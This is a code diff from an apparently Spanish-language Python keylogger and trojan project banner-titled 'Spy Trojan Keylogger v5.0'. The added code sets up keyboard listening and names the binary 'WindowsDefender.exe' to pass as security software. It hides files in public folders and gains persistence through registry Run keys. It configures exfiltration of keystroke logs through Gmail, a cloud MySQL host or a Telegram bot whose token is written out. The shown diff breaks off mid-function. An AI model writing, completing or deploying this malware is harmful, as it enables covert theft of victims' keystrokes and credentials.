@@ -1,19 +1,53 @@
+# ░██████╗██████╗░██╗░░░██╗  ████████╗██████╗░░█████╗░░░░░░██╗░█████╗░███╗░░██╗
+# ██╔════╝██╔══██╗╚██╗░██╔╝  ╚══██╔══╝██╔══██╗██╔══██╗░░░░░██║██╔══██╗████╗░██║
+# ╚█████╗░██████╔╝░╚████╔╝░  ░░░██║░░░██████╔╝██║░░██║░░░░░██║███████║██╔██╗██║
+# ░╚═══██╗██╔═══╝░░░╚██╔╝░░  ░░░██║░░░██╔══██╗██║░░██║██╗░░██║██╔══██║██║╚████║
+# ██████╔╝██║░░░░░░░░██║░░░  ░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚███║
+# ╚═════╝░╚═╝░░░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝
+
+# ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
+# ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
+# █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
+# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
+# ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v5.0
+
+#region import Libs
+from pynput.keyboard import Listener
+from getpass import getuser # Obtiene el nombre del usuario
+from datetime import datetime
+from winreg import *
+import datetime
+import random
+import os
+import telebot
+import yagmail
+import pymysql  # Lib connection mysql
+import shutil
+import string
+import time
+import threading # Hilos
+import socket    # Librería verifica internet
+#endregion
 
 
-class Functionsaaa:    #Clase
-    def __init__(self, age): # Método o función
-        self.edad = age;
-        print("Soy un nuevo método")
-    def caminar(self, hola):
-        print("Proceso Trojan"+ str(hola))
+
 
 
 
 class Config:
-    def __init__(self,host="soy el host"):
-        self.nameKey = "WindowsDefender.exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
-        self.other = ""
-        self.sdf = host
+    def __init__(self):
+        self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
+        self.NAME_STARTUP = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
+        self.PATH_OCULT = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"    # Ruta donde se esconderá el KEYLOGGER
+        self.PATH_KEY = self.PATH_OCULT+self.NAME_KEY                               # <No cambiar>
+        self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings"+ "\\"           # Ruta del Registro de teclas
+        self.LOG_NAME = "reg"+ "." + "k"                                            # Nombre y extensión del registro
+        # Importante
+        self.TIMESEND = 5 #[minutos]                                                # Tiempo de envió del registro
+        self.MODE = 2     # 0 = Gmail
+                          # 1 = DataBase                                            # Solo se puede usar una opción
+                          # 2 = TelegramBot
     class DataBase:  # Clase de Base de datos
         def __init__(self):
             self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
@@ -23,29 +57,73 @@ class Config:
             self.PORT     = "3306"                                                  # Port
     class Gmail:
         def __init__(self):
-            self.EMAIL_1 = ""
-            self.EMAIL_2 = ""
-    class Telegram:
+            self.GMAIL_1 = "correo1@gmail.com"
+            self.PASS_1  = "password1"
+            self.GMAIL_2 = "correo2@gmail.com"
+            self.PASS_2  = "password2"
+            self.GMAIL_3 = "correo3@gmail.com"
+            self.PASS_3  = "password3"
+          # Solo un correo Recibirá el Registro de Teclas
+            self.RECEIVERS = ["receivers1@yahoo.com"]
+          # Correos que recibiran el Registro de teclas, pueden ser de 1 a muchos
+          # self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
+    class TelegramBot:
         def __init__(self):
-            self.ID   = 831756903                                                     # ID Principal [Obligatorio]
+            self.ID   = 831756900                                                     # ID Principal [Obligatorio]
             self.ID_2 = 000000000                                                     # ID secundario [Opcional]
             self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
-            self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"
+            self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]
 
 
-
-
-
-
-
-
-
+class Functions:
+    def CheckFolder_StartUP(self):  # Función especial para el startUp
+        try:    # Intenta crear la dirección
+            os.makedirs("C:\\Users\\Public\\Security\\Microsoft")   # Carpeta especial de verificación de startup <No cambiar si no sabe lo que es>
+            return True     # Se creó la carpeta
+        except:
+            return False    # La carpeta ya existe
+        pass
 
 
 
 class Util:
     def __init__(self): #Constructor?
         pass
+    def CreateFolders(self):    # Crea el directorio oculto
+        try:  # Intenta crear la dirección
+            os.makedirs(Config().PATH_OCULT)
+            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_OCULT)
+        except:
+            print("[CreateFolders] - La carpeta ya existe: "+ Config().PATH_OCULT)
+        try:  # Intenta crear la dirección del registro de teclas..
+            os.makedirs(Config().PATH_KEY)
+            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_KEY)
+        except:
+            print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_KEY)
+
+
+    def addStartUp(self):
+        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        try:    # Solo si tiene permisos de administrador
+            registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)  # machine
+            SetValueEx(registry, Config().NAME_STARTUP, 0, REG_SZ, Config().PATH_KEY)
+            Functions.CheckFolder_StartUP() # Crea carpeta
+        except:
+            if Functions.CheckFolder_StartUP():
+                registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)  # local
+                SetValueEx(registry, Config().NAME_STARTUP, 0, REG_SZ, Config().PATH_KEY)
+    def Trojan(self):   # Se Replica en el sistema
+        self.CreateFolders()
+        try:
+            with open(Config().PATH_KEY, 'r') as f:  # Verifica si el keylogger se encuentra oculto en el sistema
+                print("[T]El keylogger ya se encontraba oculta en la carpeta: \n[" + Config().PATH_KEY+ "]")
+        except:
+
+
+
+
+
+
 
 
 ##print(str());
